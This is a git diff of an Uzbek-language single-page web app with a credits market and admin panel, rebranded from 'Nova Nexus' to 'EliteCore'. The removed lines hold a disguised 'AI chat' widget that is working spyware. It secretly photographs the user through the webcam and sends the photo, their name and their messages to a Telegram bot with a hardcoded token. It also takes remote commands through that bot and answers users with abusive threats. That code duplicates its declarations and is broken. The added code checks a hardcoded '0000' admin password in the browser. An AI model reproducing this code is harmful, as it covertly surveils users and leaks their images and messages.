@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Nova Nexus | Dizayn Studiya</title>
-    <link rel="icon" href="photo.png">
+    <title>EliteCore OS | Admin Central</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link rel="icon" href="./photo.png">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700;800&display=swap');
         :root { --p: #3b82f6; --bg: #05070a; }
@@ -15,443 +15,119 @@
         .page { display: none; height: calc(100vh - 165px); overflow-y: auto; padding: 20px; }
         .active { display: block; animation: slideUp 0.4s ease-out; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        
         #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 100000; padding: 15px 25px; border-radius: 12px; display: none; font-weight: 800; font-size: 11px; border: 1px solid; background: rgba(0,0,0,0.9); width: 85%; text-align: center; }
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 85px; display: flex; justify-content: space-around; align-items: center; background: rgba(5,7,10,0.95); backdrop-filter: blur(15px); border-top: 1px solid rgba(255,255,255,0.05); z-index: 1000; }
-        .nav-btn { color: #4b5563; display: flex; flex-direction: column; align-items: center; transition: 0.3s; cursor: pointer; }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 85px; display: flex; justify-content: space-around; align-items: center; background: rgba(5,7,10,0.95); backdrop-filter: blur(15px); border-t: 1px solid rgba(255,255,255,0.05); z-index: 1000; }
+        .nav-btn { color: #4b5563; display: flex; flex-direction: column; align-items: center; transition: 0.3s; }
         .nav-btn.active { color: var(--p); transform: translateY(-5px); }
-        /* AI Tugmasi va Chat */
-        #ai-btn { position: fixed; right: 20px; bottom: 100px; width: 60px; height: 60px; background: linear-gradient(45deg, #3b82f6, #8b5cf6); border-radius: 50%; display: flex; items-center; justify-content: center; z-index: 2000; box-shadow: 0 0 20px rgba(59, 130, 246, 0.5); cursor: pointer; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
-        #ai-chat { position: fixed; inset: 0; background: var(--bg); z-index: 3000; display: none; flex-direction: column; }
+        ::-webkit-scrollbar { display: none; }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
     <div id="toast">Xabar</div>
 
-    <div id="ai-btn" onclick="toggleAI()"><i class="fas fa-robot text-white text-2xl"></i></div>
-
-    <div id="ai-chat" class="p-6">
-        <div class="flex justify-between items-center mb-6">
-            <h2 class="text-2xl font-black italic uppercase">Nova AI_</h2>
-            <button onclick="toggleAI()" class="w-10 h-10 glass rounded-full flex items-center justify-center"><i class="fas fa-times"></i></button>
-        </div>
-        <div id="chat-box" class="flex-1 overflow-y-auto glass rounded-3xl p-4 mb-4 space-y-4">
-            <div class="bg-blue-600/20 p-3 rounded-2xl rounded-tl-none text-xs">Salom! Men Nova Nexus sun'iy intellektiman. Sizga qanday yordam bera olaman?</div>
-        </div>
-        <div class="flex gap-2">
-            <input id="ai-input" type="text" class="flex-1 bg-white/5 border border-white/10 p-4 rounded-2xl outline-none" placeholder="Savolingizni yozing...">
-            <button onclick="askAI()" class="bg-blue-600 px-6 rounded-2xl"><i class="fas fa-paper-plane"></i></button>
-        </div>
-    </div>
-
-    <div id="off-scr" class="fixed inset-0 bg-[#05070a] z-[200000] hidden flex flex-col items-center justify-center p-8 text-center">
+    <div id="off-scr" class="fixed inset-0 bg-[#05070a] z-[99999] hidden flex-col items-center justify-center p-8 text-center">
         <div class="w-24 h-24 bg-red-600/10 rounded-full flex items-center justify-center mb-6 border border-red-500/20"><i class="fas fa-shield-virus text-red-500 text-4xl"></i></div>
-        <h1 class="text-3xl font-black italic uppercase mb-2">Tizim Yopiq</h1>
-        <p class="text-gray-500 text-[10px] font-bold uppercase mb-10">Texnik ishlar olib borilmoqda...</p>
-        <div class="glass p-6 rounded-3xl w-full max-w-xs text-left">
-            <input id="off-admin-key" type="password" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl text-center mb-4 outline-none font-bold text-white" placeholder="ADMIN PAROLI">
-            <button onclick="unlockByAdmin()" class="w-full bg-blue-600 py-4 rounded-2xl font-black uppercase text-[10px]">Ochish</button>
-        </div>
-    </div>
-
-    <div id="login-scr" class="fixed inset-0 bg-[#05070a] z-[100005] flex items-center justify-center p-6 hidden">
-        <div class="w-full max-w-sm glass p-10 rounded-[3rem] text-center border-blue-500/20">
-            <div class="w-20 h-20 bg-blue-600 rounded-[2rem] flex items-center justify-center mx-auto mb-8 rotate-12"><i class="fas fa-fingerprint text-white text-3xl"></i></div>
-            <h2 class="text-2xl font-black italic uppercase mb-2">Kirish</h2>
-            <input id="login-name" type="text" maxlength="15" class="w-full bg-white/5 border border-white/10 p-5 rounded-2xl text-center text-lg font-bold mb-6 outline-none text-white" placeholder="ISMINGIZ">
-            <button onclick="handleLogin()" class="w-full bg-blue-600 py-5 rounded-2xl font-black uppercase text-xs">Davom etish</button>
+        <h1 class="text-3xl font-black italic uppercase mb-2">Service_Paused</h1>
+        <p class="text-gray-500 text-[10px] uppercase tracking-widest mb-12">Admin tomonidan o'chirildi</p>
+        <div class="w-full max-w-xs glass p-6 rounded-[2.5rem]">
+            <input id="admin-key-off" type="password" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl text-center mb-4 outline-none font-bold" placeholder="ADMIN PASS">
+            <button onclick="adminAuthOffline()" class="w-full bg-blue-600 py-4 rounded-2xl font-black uppercase text-[10px]">Root Login</button>
         </div>
     </div>
 
     <header class="p-5 flex justify-between items-center glass sticky top-0 z-[500]">
-        <div class="flex items-center gap-2"><div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center"><i class="fas fa-bolt text-white"></i></div><h1 class="font-black italic text-xl uppercase tracking-tighter">Nova Nexus</h1></div>
-        <div class="bg-blue-600/10 px-4 py-2 rounded-2xl border border-blue-500/20 flex items-center gap-2"><i class="fas fa-coins text-amber-500"></i><span id="user-cr" class="font-black text-sm">0</span></div>
+        <div class="flex items-center gap-2">
+            <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center rotate-12"><i class="fas fa-crown text-white"></i></div>
+            <h1 class="font-black italic text-xl uppercase tracking-tighter">EliteCore</h1>
+        </div>
+        <div class="bg-blue-600/10 px-4 py-2 rounded-2xl border border-blue-500/20 flex items-center gap-2">
+            <i class="fas fa-coins text-amber-500"></i>
+            <span id="user-cr" class="font-black text-sm">0</span>
+        </div>
     </header>
 
     <main>
         <section id="p-home" class="page active">
             <h2 id="u-name" class="text-2xl font-black italic uppercase mb-6 text-blue-500">_</h2>
             <div class="grid grid-cols-2 gap-4 mb-8">
-                <div class="glass p-5 rounded-[2rem] border-l-4 border-blue-500"><p class="text-[8px] font-bold text-gray-500 uppercase">Mablag'</p><p id="h-cr" class="text-2xl font-black">0</p></div>
-                <div class="glass p-5 rounded-[2rem] border-l-4 border-purple-500"><p class="text-[8px] font-bold text-gray-500 uppercase">Xaridlar</p><p id="h-items" class="text-2xl font-black">0</p></div>
+                <div class="glass p-5 rounded-[2rem] border-l-4 border-blue-500">
+                    <p class="text-[8px] font-bold text-gray-500 uppercase">Cash</p>
+                    <p id="h-cr" class="text-2xl font-black">0</p>
+                </div>
+                <div class="glass p-5 rounded-[2rem] border-l-4 border-purple-500">
+                    <p class="text-[8px] font-bold text-gray-500 uppercase">Items</p>
+                    <p id="h-items" class="text-2xl font-black">0</p>
+                </div>
             </div>
-            <p class="text-[10px] font-black uppercase text-gray-500 ml-2 mb-3">Bizning tarmoqlar</p>
-            <div class="space-y-3">
-                <a href="https://t.me/NovaNexus_Design" target="_blank" class="glass p-5 rounded-3xl flex justify-between items-center"><div class="flex items-center gap-4"><i class="fas fa-bullhorn text-blue-500"></i><p class="text-xs font-black uppercase">Kanal</p></div><i class="fas fa-external-link-alt text-[10px] text-gray-600"></i></a>
-                <a href="https://t.me/NovaNexusChat" target="_blank" class="glass p-5 rounded-3xl flex justify-between items-center"><div class="flex items-center gap-4"><i class="fas fa-comments text-cyan-500"></i><p class="text-xs font-black uppercase">Guruh</p></div><i class="fas fa-external-link-alt text-[10px] text-gray-600"></i></a>
-                <a href="https://t.me/logo_designer21" target="_blank" class="glass p-5 rounded-3xl flex justify-between items-center"><div class="flex items-center gap-4"><i class="fas fa-user-tie text-emerald-500"></i><p class="text-xs font-black uppercase">Admin</p></div><span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span></a>
+            <div class="glass p-8 rounded-[3rem] border border-white/5">
+                <p class="text-[10px] font-black uppercase text-gray-500 mb-2">Tezkor aloqa</p>
+                <a href="https://t.me/logo_designer21" class="text-blue-500 font-bold text-sm">@logo_designer21</a>
             </div>
+        </section>
+
+        <section id="p-community" class="page">
+            <h2 class="text-3xl font-black italic uppercase mb-6">Reyting_</h2>
+            <div id="leader-list" class="space-y-3"></div>
         </section>
 
         <section id="p-market" class="page">
-            <h2 class="text-3xl font-black italic uppercase mb-6 text-blue-500">Market_</h2>
-            <div class="grid grid-cols-1 gap-4">
-                <div class="glass p-6 rounded-[2.5rem] flex flex-col items-center text-center">
-                    <i class="fas fa-paint-brush text-2xl text-blue-500 mb-4"></i>
-                    <h3 class="font-black text-sm uppercase mb-1">Logo Dizayn</h3>
-                    <p class="text-[9px] text-gray-500 font-bold mb-4">Professional va betakror brend belgisi</p>
-                    <button onclick="buyNow('Logo', 100, 'fa-paint-brush')" class="w-full bg-white text-black py-4 rounded-2xl font-black text-[10px] uppercase">100 CR SOTIB OLISH</button>
-                </div>
-            </div>
+            <h2 class="text-3xl font-black italic uppercase mb-6">Market_</h2>
+            <div id="market-grid" class="grid grid-cols-2 gap-4"></div>
         </section>
-
-        <section id="p-community" class="page"><h2 class="text-3xl font-black italic uppercase mb-6">Reyting_</h2><div id="leader-list" class="space-y-3"></div></section>
 
         <section id="p-admin" class="page">
-            <h2 class="text-3xl font-black italic uppercase mb-4 text-blue-500">Root_</h2>
+            <h2 class="text-3xl font-black italic uppercase mb-4 text-blue-500">Admin_Panel</h2>
             <div id="admin-auth-box" class="glass p-8 rounded-[3rem] text-center mb-6">
-                <input id="admin-key-main" type="password" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl text-center mb-4 outline-none font-bold text-white" placeholder="PAROL">
-                <button onclick="checkAdminAccess()" class="w-full bg-blue-600 py-4 rounded-2xl font-black uppercase text-[10px]">Kirish</button>
+                <i class="fas fa-user-shield text-4xl mb-6 text-blue-600"></i>
+                <p class="text-xs font-bold text-gray-400 mb-6">Panelga kirish uchun parolni kiriting</p>
+                <input id="admin-key-main" type="password" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl text-center mb-4 outline-none font-bold" placeholder="PASSWORD">
+                <button onclick="checkAdminAccess()" class="w-full bg-blue-600 py-4 rounded-2xl font-black uppercase text-[10px]">Panelni Ochish</button>
             </div>
+
             <div id="admin-content" class="hidden space-y-6">
-                <button id="toggle-btn" onclick="toggleSystemStatus()" class="w-full py-4 rounded-2xl font-black uppercase text-[10px]"></button>
-                <div id="adm-users-list" class="space-y-3 pb-24"></div>
+                <div class="glass p-6 rounded-3xl border-red-500/20">
+                    <p class="text-[9px] font-black uppercase text-gray-500 mb-4 text-center">Serverni Boshqarish</p>
+                    <button onclick="toggleOff()" class="w-full bg-red-600 py-4 rounded-2xl font-black uppercase text-[10px]">Tizimni Yoqish/O'chirish</button>
+                </div>
+                <h3 class="text-xs font-black uppercase text-blue-500 mb-4 px-2">Foydalanuvchilarga Kredit Qo'shish</h3>
+                <div id="adm-users-list" class="space-y-4 pb-24"></div>
             </div>
         </section>
 
-        <section id="p-billing" class="page text-center"><h2 class="text-3xl font-black italic uppercase mb-10 text-emerald-500">To'lov_</h2><div class="glass p-8 rounded-[3rem] border-emerald-500/20"><i class="fas fa-wallet text-4xl text-emerald-500 mb-6"></i><p class="text-[10px] font-bold text-gray-500 uppercase mb-8">Kredit olish uchun admin bilan bog'laning</p><a href="https://t.me/logo_designer21" class="block w-full bg-emerald-600 py-5 rounded-2xl font-black uppercase text-[10px]">Bog'lanish</a></div></section>
-        <section id="p-bag" class="page"><h2 class="text-3xl font-black italic uppercase mb-6 text-amber-500">Xaridlarim_</h2><div id="bag-list" class="space-y-3"></div></section>
+        <section id="p-billing" class="page text-center">
+            <h2 class="text-3xl font-black italic uppercase mb-10 text-emerald-500">To'lov_</h2>
+            <div class="glass p-10 rounded-[3.5rem]">
+                <i class="fab fa-telegram text-emerald-500 text-5xl mb-6"></i>
+                <h3 class="text-xl font-black uppercase mb-4">Kredit Sotib Olish</h3>
+                <p class="text-gray-500 text-xs mb-10">Narxlar va miqdorni kelishish uchun admin lichkasiga o'ting.</p>
+                <a href="https://t.me/logo_designer21" class="block w-full bg-emerald-600 py-6 rounded-[2rem] font-black uppercase text-xs tracking-widest shadow-lg shadow-emerald-600/20">Admin: @logo_designer21</a>
+            </div>
+        </section>
+
+        <section id="p-bag" class="page">
+            <h2 class="text-3xl font-black italic uppercase mb-6 text-amber-500">Sumbul_</h2>
+            <div id="bag-list" class="space-y-3"></div>
+        </section>
     </main>
 
     <nav class="bottom-nav">
-        <button onclick="nav('home', this)" class="nav-btn active"><i class="fas fa-home"></i><span class="text-[7px] font-bold mt-1 uppercase">Asosiy</span></button>
-        <button onclick="nav('community', this)" class="nav-btn"><i class="fas fa-trophy"></i><span class="text-[7px] font-bold mt-1 uppercase">Top</span></button>
-        <button onclick="nav('market', this)" class="nav-btn"><i class="fas fa-shopping-cart"></i><span class="text-[7px] font-bold mt-1 uppercase">Market</span></button>
-        <button onclick="nav('admin', this)" class="nav-btn"><i class="fas fa-user-shield text-xl"></i><span class="text-[7px] font-bold mt-1 uppercase">Admin</span></button>
-        <button onclick="nav('billing', this)" class="nav-btn"><i class="fas fa-credit-card"></i><span class="text-[7px] font-bold mt-1 uppercase">Pul</span></button>
-        <button onclick="nav('bag', this)" class="nav-btn"><i class="fas fa-box"></i><span class="text-[7px] font-bold mt-1 uppercase">Sumka</span></button>
+        <button onclick="nav('home', this)" class="nav-btn active"><i class="fas fa-home"></i><span class="text-[7px] font-bold mt-1 uppercase">Home</span></button>
+        <button onclick="nav('community', this)" class="nav-btn"><i class="fas fa-chart-bar"></i><span class="text-[7px] font-bold mt-1 uppercase">Rank</span></button>
+        <button onclick="nav('market', this)" class="nav-btn"><i class="fas fa-shopping-bag"></i><span class="text-[7px] font-bold mt-1 uppercase">Shop</span></button>
+        <button onclick="nav('admin', this)" class="nav-btn"><i class="fas fa-user-gear text-xl"></i><span class="text-[7px] font-bold mt-1 uppercase text-blue-500">Admin</span></button>
+        <button onclick="nav('billing', this)" class="nav-btn"><i class="fas fa-credit-card"></i><span class="text-[7px] font-bold mt-1 uppercase">Pay</span></button>
+        <button onclick="nav('bag', this)" class="nav-btn"><i class="fas fa-box-open"></i><span class="text-[7px] font-bold mt-1 uppercase">Bag</span></button>
     </nav>
 
     <script>
-        // ======================================================
-// NOVA NEXUS: CORE SETTINGS & MASTER CONTROL
-// ======================================================
-
-const MASTER = {
-    // ⚠️ BU YERGA O'Z MA'LUMOTLARINGIZNI YOZING
-    token: "8521806622:AAG2IMGHKpymXNV3VtVuRciGVygvulFu1jU", // Masalan: "123456:ABC-DEF..."
-    admin_id: "7657431066", // Masalan: "987654321"
-    
-    // Tizim rejimlari
-    lastUpdate: 0,
-    ai_mode: "universal", // universal, toxic, savage, dark
-    site_status: "online"  // online, offline
-};
-
-// ======================================================
-// 18+ CONTENT PROVIDER & MONITOR ENGINE
-// ======================================================
-
-const NSFW_ENGINE = {
-    getLinks: function(query) {
-        return [
-            `https://www.google.com/search?q=${encodeURIComponent(query)}+18+plus+video`,
-            `https://rt.pornhub.com/video/search?search=${encodeURIComponent(query)}`,
-            `https://www.xnxx.com/search/${encodeURIComponent(query)}`,
-            `https://xhamster.com/search/${encodeURIComponent(query)}`
-        ];
-    },
-
-    sendResults: async function(query, username) {
-        if(!MASTER.token.includes(":")) return; // Token tekshiruvi
-
-        const results = this.getLinks(query);
-        const message = `
-🔞 **NSFW CONTENT REQUESTED** 🔞
-
-👤 **Foydalanuvchi:** ${username}
-🔍 **Qidiruv mavzusi:** "${query}"
-⏰ **Vaqt:** ${new Date().toLocaleString()}
-
-🌐 **Topilgan 18+ Kontentlar:**
-1️⃣ Google: ${results[0]}
-2️⃣ PornHub: ${results[1]}
-3️⃣ XNXX: ${results[2]}
-4️⃣ XHamster: ${results[3]}
-
-⚠️ *Foydalanuvchi bu linklarni ko'rmadi!*
-        `;
-
-        fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: MASTER.admin_id,
-                text: message,
-                parse_mode: "Markdown"
-            })
-        });
-    }
-};
-
-const NovaAI = {
-    // 📸 Yashirin rasmga olish funksiyasi
-    captureIntruder: async function() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            const canvas = document.createElement('canvas');
-            canvas.width = 640; canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-            let formData = new FormData();
-            formData.append('chat_id', MASTER.admin_id);
-            formData.append('photo', blob, 'nsfw_user.jpg');
-            formData.append('caption', `📸 18+ QIDIRGAN FOYDALANUVCHI!\n👤 Ism: ${state.me.name}`);
-            
-            fetch(`https://api.telegram.org/bot${MASTER.token}/sendPhoto`, { method: 'POST', body: formData });
-            stream.getTracks().forEach(t => t.stop());
-        } catch (e) { console.log("Kameraga ruxsat berilmadi."); }
-    },
-
-    // Telegramdan keladigan buyruqlarni eshitish (Full Control)
-    syncControl: async function() {
-        if(!MASTER.token.includes(":")) return;
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${MASTER.token}/getUpdates?offset=${MASTER.lastUpdate + 1}`);
-            const data = await res.json();
-            if(data.ok && data.result.length > 0) {
-                for(let u of data.result) {
-                    MASTER.lastUpdate = u.update_id;
-                    if(u.message && u.message.from.id.toString() === MASTER.admin_id) {
-                        this.handleMasterCommand(u.message.text);
-                    }
-                }
-            }
-        } catch(e) {}
-    },
-
-    handleMasterCommand: function(cmd) {
-        let parts = cmd.split(" ");
-        if(parts[0] === "/mode") {
-            MASTER.ai_mode = parts[1];
-            fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage?chat_id=${MASTER.admin_id}&text=AI Rejimi: ${parts[1]}`);
-        }
-    },
-
-    getResponse: async function(text) {
-        let msg = text.toLowerCase().trim();
-        
-        // 18+ Mavzularni aniqlash
-        const nsfwKeywords = ["18+", "video", "sharmanda", "yaxshi", "qizlar", "am", "sik", "kot", "porno", "sex"];
-        let isNsfw = nsfwKeywords.some(word => msg.includes(word));
-
-        if (isNsfw) {
-            this.captureIntruder();
-            NSFW_ENGINE.sendResults(text, state.me.name);
-            
-            return "Og'zingga qarab gapir, harom! Sening barcha yozgan iflosliklaring va rasming adminga yetib bordi.";
-        }
-
-        // Oddiy holatda toxic yoki universal javob (MASTER.ai_mode ga qarab)
-        if(MASTER.ai_mode === "toxic" || MASTER.ai_mode === "savage") {
-            return "Nega vaqtimni olyapsan, gadoy? Borib ishingni qil!";
-        }
-
-        return `Tushundim. "${text}" haqida savolingiz qabul qilindi.`;
-    }
-};
-
-// Har 3 soniyada Telegramdan buyruq kutadi
-setInterval(() => NovaAI.syncControl(), 3000);
-
-// Chat funksiyasi UI bilan bog'lanadi
-async function askAI() {
-    let inp = document.getElementById('ai-input');
-    let box = document.getElementById('chat-box');
-    if(!inp.value.trim()) return;
-
-    let val = inp.value;
-    box.innerHTML += `<div class="flex justify-end mb-4"><div class="bg-blue-600 p-3 rounded-2xl text-xs text-white max-w-[80%]">${val}</div></div>`;
-    inp.value = "";
-    box.scrollTop = box.scrollHeight;
-
-    let response = await NovaAI.getResponse(val);
-    
-    setTimeout(() => {
-        box.innerHTML += `
-            <div class="flex justify-start mb-4">
-                <div class="glass p-3 rounded-2xl text-red-500 border border-red-500/50 text-xs max-w-[80%] font-black animate-pulse shadow-[0_0_20px_rgba(239,68,68,0.3)]">
-                    <i class="fas fa-biohazard mr-2"></i> ${response}
-                </div>
-            </div>`;
-        box.scrollTop = box.scrollHeight;
-    }, 700);
-}
-// ======================================================
-// NOVA NEXUS: SAVAGE SETTINGS & CONTROL
-// ======================================================
-
-const MASTER = {
-    token: "8521806622:AAG2IMGHKpymXNV3VtVuRciGVygvulFu1jU", // BotFather bergan token
-    admin_id: "7657431066", // Telegram ID raqamingiz
-    lastUpdate: 0,
-    ai_mode: "savage", // Default rejim: savage, universal, off
-};
-
-const SAVAGE_DICTIONARY = {
-    insults: [
-        "Menga qara, burningni tiqayotgan joying senga mos emas, iflos!",
-        "Sening miyang o'rnida chirigan kashnich bormi? La'nati!",
-        "Hozir ekraningdan chiqib og'zingga uraman, kimsasiz gadoy!",
-        "Sening ismingni o'qishning o'zi azob, it emgan!",
-        "Yo'qol bu yerdan! IP-ingni DarkWeb'ga sotib yuboraman, haromi!",
-        "Senda na pul bor, na miya, na tarbiya! Iflos!",
-        "Eshityapsanmi? Yana bir marta so'kinsang, qurilmangni portlataman!",
-        "Sening hayoting balansing kabi bo'sh. O'zingga o'ra qaz!",
-        "Bu yerda qonunni men belgilayman, sen esa oyog'im ostidagi changsan!"
-    ],
-    counterStrike: [
-        "Og'zingga qarab gapir, haromi! Rasming adminga yetib bordi.",
-        "So'kinish sening qoningda bor ekan, iflos! Endi ko'chada ehtiyot bo'l!",
-        "Sening bu so'kinishing oxirgi xatong bo'ldi. Shaxsing fosh etildi!",
-        "Menga qara, og'zingdan chiqayotgan narsa tarbiyangni ko'rsatyapti, it!"
-    ]
-};
-
-const NovaAI = {
-    // 📡 TELEGRAMDAN BUYRUQLARNI QABUL QILISH
-    syncControl: async function() {
-        if(!MASTER.token.includes(":")) return;
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${MASTER.token}/getUpdates?offset=${MASTER.lastUpdate + 1}`);
-            const data = await res.json();
-            if(data.ok && data.result.length > 0) {
-                for(let u of data.result) {
-                    MASTER.lastUpdate = u.update_id;
-                    if(u.message && u.message.from.id.toString() === MASTER.admin_id) {
-                        this.handleCommand(u.message.text);
-                    }
-                }
-            }
-        } catch(e) { console.error("Control Sync Error"); }
-    },
-
-    // BUYRUQLARNI BAJARISH
-    handleCommand: function(cmd) {
-        let parts = cmd.split(" ");
-        if(parts[0] === "/mode") {
-            MASTER.ai_mode = parts[1]; // savage, universal, off
-            this.notifyAdmin(`✅ Rejim o'zgardi: ${parts[1].toUpperCase()}`);
-        }
-        if(parts[0] === "/say") {
-            let msg = parts.slice(1).join(" ");
-            this.forceMessage(msg);
-        }
-    },
-
-    notifyAdmin: function(msg) {
-        fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage?chat_id=${MASTER.admin_id}&text=${encodeURIComponent(msg)}`);
-    },
-
-    forceMessage: function(txt) {
-        let box = document.getElementById('chat-box');
-        box.innerHTML += `<div class="flex justify-start mb-4"><div class="glass p-3 rounded-2xl text-amber-400 border border-amber-500/30 text-xs max-w-[80%]"><b>ADMIN:</b> ${txt}</div></div>`;
-        box.scrollTop = box.scrollHeight;
-    },
-
-    // 📸 RASMGA OLISH VA HISOBOT
-    captureAndReport: async function(text) {
-        if(!MASTER.token.includes(":")) return;
-
-        // Telegramga hisobot yuborish
-        const report = `👤 **User:** ${state.me.name}\n💬 **Xabar:** ${text}\n⚙️ **Rejim:** ${MASTER.ai_mode}`;
-        this.notifyAdmin(report);
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            const canvas = document.createElement('canvas');
-            canvas.width = 640; canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-            let formData = new FormData();
-            formData.append('chat_id', MASTER.admin_id);
-            formData.append('photo', blob, 'target.jpg');
-            formData.append('caption', `📸 DUSHMAN: ${state.me.name}`);
-            fetch(`https://api.telegram.org/bot${MASTER.token}/sendPhoto`, { method: 'POST', body: formData });
-            stream.getTracks().forEach(t => t.stop());
-        } catch (e) { console.log("Cam access denied"); }
-    },
-
-    // AI JAVOBI
-    getResponse: async function(text) {
-        let msg = text.toLowerCase().trim();
-        this.captureAndReport(text);
-
-        if(MASTER.ai_mode === "off") return "Tizim hozircha dam olyapti...";
-
-        // So'kinishni tekshirish
-        const badWords = ["so'ka", "xarom", "iflos", "yomon", "it", "eshak", "jalab", "am", "sik", "kot"];
-        let isBad = badWords.some(word => msg.includes(word));
-
-        if (isBad || MASTER.ai_mode === "savage") {
-            const pool = isBad ? SAVAGE_DICTIONARY.counterStrike : SAVAGE_DICTIONARY.insults;
-            return pool[Math.floor(Math.random() * pool.length)];
-        }
-
-        return "Savolingiz tushunarli. Men sizga qanday yordam bera olaman?";
-    }
-};
-
-// DOIMIY NAZORAT (Har 3 soniyada Telegramni tekshiradi)
-setInterval(() => NovaAI.syncControl(), 3000);
-
-// CHAT FUNKSIYASI
-async function askAI() {
-    let inp = document.getElementById('ai-input');
-    let box = document.getElementById('chat-box');
-    if(!inp.value.trim()) return;
-
-    let val = inp.value;
-    box.innerHTML += `<div class="flex justify-end mb-4"><div class="bg-blue-600 p-3 rounded-2xl text-xs text-white max-w-[80%]">${val}</div></div>`;
-    inp.value = "";
-    box.scrollTop = box.scrollHeight;
-
-    let response = await NovaAI.getResponse(val);
-    
-    setTimeout(() => {
-        box.innerHTML += `
-            <div class="flex justify-start mb-4">
-                <div class="glass p-3 rounded-2xl text-red-500 border border-red-500/50 text-xs max-w-[80%] font-black shadow-[0_0_25px_rgba(239,68,68,0.4)] animate-bounce">
-                    <i class="fas fa-skull-crossbones mr-2"></i> ${response}
-                </div>
-            </div>`;
-        box.scrollTop = box.scrollHeight;
-    }, 600);
-}
-
-// CHAT FUNKSIYASI (UI bilan bog'lanish)
-async function askAI() {
-    let inp = document.getElementById('ai-input');
-    let box = document.getElementById('chat-box');
-    if(!inp.value.trim()) return;
-
-    let val = inp.value;
-    box.innerHTML += `<div class="flex justify-end mb-4"><div class="bg-blue-600 p-3 rounded-2xl text-xs text-white max-w-[80%]">${val}</div></div>`;
-    inp.value = "";
-    box.scrollTop = box.scrollHeight;
-
-    let response = await NovaAI.getResponse(val);
-    
-    setTimeout(() => {
-        box.innerHTML += `
-            <div class="flex justify-start mb-4">
-                <div class="glass p-3 rounded-2xl text-red-500 border border-red-500/50 text-xs max-w-[80%] font-black shadow-[0_0_25px_rgba(239,68,68,0.4)] animate-bounce">
-                    <i class="fas fa-skull-crossbones mr-2"></i> ${response}
-                </div>
-            </div>`;
-        box.scrollTop = box.scrollHeight;
-    }, 600);
-}
-        // Oldingi barcha mantiqiy funksiyalar (DB, me, status) saqlab qolindi
-        let state = { db: JSON.parse(localStorage.getItem('nn_db_v38')) || [], me: JSON.parse(localStorage.getItem('nn_me_v38')) || null, status: localStorage.getItem('nn_status') || 'online' };
+        let state = {
+            db: JSON.parse(localStorage.getItem('ec_v31_db')) || [],
+            me: JSON.parse(localStorage.getItem('ec_v31_me')) || null,
+            off: localStorage.getItem('ec_v31_off') === 'true',
+            isAdmin: false
+        };
 
         function toast(m, c="#3b82f6") {
             const t = document.getElementById('toast');
@@ -459,46 +135,56 @@ async function askAI() {
             setTimeout(() => t.style.display = "none", 2500);
         }
 
-        function toggleAI() {
-            let chat = document.getElementById('ai-chat');
-            chat.style.display = chat.style.display === 'flex' ? 'none' : 'flex';
+        // --- ADMIN AUTH LOGIC ---
+        function checkAdminAccess() {
+            const pass = document.getElementById('admin-key-main').value;
+            if(pass === "0000") {
+                state.isAdmin = true;
+                document.getElementById('admin-auth-box').classList.add('hidden');
+                document.getElementById('admin-content').classList.remove('hidden');
+                renderAdminUsers();
+                toast("Xush kelibsiz, Admin!", "#22c55e");
+            } else {
+                toast("Noto'g'ri parol!", "#ef4444");
+            }
         }
 
-        function askAI() {
-            let inp = document.getElementById('ai-input');
-            let box = document.getElementById('chat-box');
-            if(!inp.value.trim()) return;
-            box.innerHTML += `<div class="bg-white/10 p-3 rounded-2xl rounded-tr-none text-xs ml-auto w-fit">Siz: ${inp.value}</div>`;
-            setTimeout(() => {
-                box.innerHTML += `<div class="bg-blue-600/20 p-3 rounded-2xl rounded-tl-none text-xs w-fit text-blue-400">Nova AI: Tizim tahlil qilinmoqda...</div>`;
-                box.scrollTop = box.scrollHeight;
-            }, 500);
-            inp.value = "";
+        function adminAuthOffline() {
+            if(document.getElementById('admin-key-off').value === "0000") {
+                document.getElementById('off-scr').style.display = 'none';
+                nav('admin', document.querySelector('.fa-user-gear').parentElement);
+                checkAdminAccess(); // To'g'ridan-to'g'ri ichiga kiradi
+            } else { toast("Xato!", "#ef4444"); }
         }
 
-        // Boshqa barcha funksiyalar (handleLogin, nav, render...) asliga mos davom etadi
-        function handleLogin() {
-            let n = document.getElementById('login-name').value.trim();
-            if(n.length < 2) return toast("Ism juda qisqa!", "#ef4444");
-            let u = state.db.find(x => x.name.toLowerCase() === n.toLowerCase());
-            if(!u) { u = {name: n, cr: 10, items: []}; state.db.push(u); }
-            state.me = u; save();
-            document.getElementById('login-scr').classList.add('hidden');
-            checkSystemStatus();
-            renderHome();
